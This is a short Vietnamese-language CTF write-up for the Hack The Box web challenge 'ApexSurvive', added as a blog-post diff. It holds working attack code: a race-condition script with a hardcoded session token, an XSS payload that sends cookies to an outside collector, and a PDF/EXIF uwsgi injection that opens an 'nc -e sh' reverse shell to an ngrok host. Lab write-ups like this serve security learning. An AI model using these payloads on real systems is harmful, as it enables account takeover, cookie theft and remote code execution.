@@ -1,0 +1,109 @@
+---
+title: ApexSurvive
+description: 'Created: September 14, 2025 11:23 AM'
+date: 2026-01-03
+tags:
+  - writeup
+category: web
+draft: false
+---
+
+Created: September 14, 2025 11:23 AM
+
+![image.png](/uploads/apexsurvive/ApexSurvive/image.png)
+
+- Ý tưởng: Nhận thấy bot chỉ visit product id, hoặc nhiều hướng khác nhưng hướng ở đây unintended
+- Ta race để có internal account
+- post lên product note chèn payload xss $&#123;fetch('[https://k31x5f3u.requestrepo.com/?'+document.cookie](https://k31x5f3u.requestrepo.com/?%27+document.cookie))&#125;, payload bypass check dom
+- lấy được cookie admin ra ngoài
+- tiếp ta tận dụng uwsgi arbitrary write để lên rce qua chức năng post pdf file
+
+```python
+#!/usr/bin/env python3
+import asyncio, httpx, random, requests
+import time
+
+# ---- Fill these ----
+BASE         = "https://94.237.121.82:41632/"
+SESSION_JWT  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzU3ODg0MzkwLCJhbnRpQ1NSRlRva2VuIjoiYTYxMTVjM2ItYzBjMC00YWMyLWI4ZTItNmNhZGI3MjgyZTM2In0.r90-iiP8ryw2HMA4Au0YqA756w4tJb2N6RwoDmMPez0"
+ANTI_CSRF    = "a6115c3b-c0c0-4ac2-b8e2-6cadb7282e36"
+
+# Race plan: send 3 rapid updates (you can reorder/change these)
+EMAILS = [
+    "youaaa@apexsurvive.htb",
+    "test@email.htb",
+    "youaaa@apexsurvive.htb",
+    "youaaa@apexsurvive.htb",
+]
+USERNAME = "you"
+FULLNAME = "you"
+# ---------------------
+
+PROFILE_URL = f"{BASE.rstrip('/')}/challenge/api/profile"
+
+async def post_profile(c: httpx.AsyncClient, email: str):
+    data = {
+        "email": email,
+        "username": USERNAME,
+        "fullName": FULLNAME,
+        "antiCSRFToken": ANTI_CSRF,
+    }
+    r = await c.post(PROFILE_URL, data=data)
+    txt = (r.text[:120] + "...") if len(r.text) > 120 else r.text
+    print(f"[{email}] -> {r.status_code} {txt}")
+    return r
+
+async def test():
+    timeout = httpx.Timeout(10.0, connect=10.0)
+    async with httpx.AsyncClient(
+        verify=False,
+        timeout=timeout,
+        headers={"User-Agent": "apex-race/1.0"},
+        cookies={"session": SESSION_JWT},
+    ) as c:
+        # small jitters to maximize server interleaving; tweak or set to 0.0
+        tasks = []
+        for i, email in enumerate(EMAILS):
+            tasks.append(asyncio.create_task(post_profile(c, email)))
+
+        await asyncio.gather(*tasks)
+        # await asyncio.sleep(0.5)
+
+def check():
+    r = requests.get(f"{BASE}email/", cookies={"session": SESSION_JWT}, verify=False)
+    if "youaaa@apexsurvive.htb" in r.text:
+        print("Success! Check your email inbox for the verification link.")
+        exit(0)
+
+if __name__ == "__main__":
+    while True:
+        asyncio.run(test())
+        check()
+        time.sleep(1)
+
+
+```
+
+```python
+from fpdf import FPDF
+from exiftool import ExifToolHelper
+
+with ExifToolHelper() as et:
+    et.set_tags(
+        ["test.jpg"],
+        tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://nc 0.tcp.ap.ngrok.io 10554 -e sh)&#x0a;"},
+        params=["-E", "-overwrite_original"]
+    )
+
+class MyFPDF(FPDF):
+    pass
+
+pdf = MyFPDF()
+
+pdf.add_page()
+pdf.image('./test.jpg')
+pdf.output('payload.pdf', 'F')
+```
+
+- Ý tưởng bài này intended rất khó, có thể đọc để tham khảo thêm
+- https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/web/%5BInsane%5D%20apexsurvive/official_writeup.md
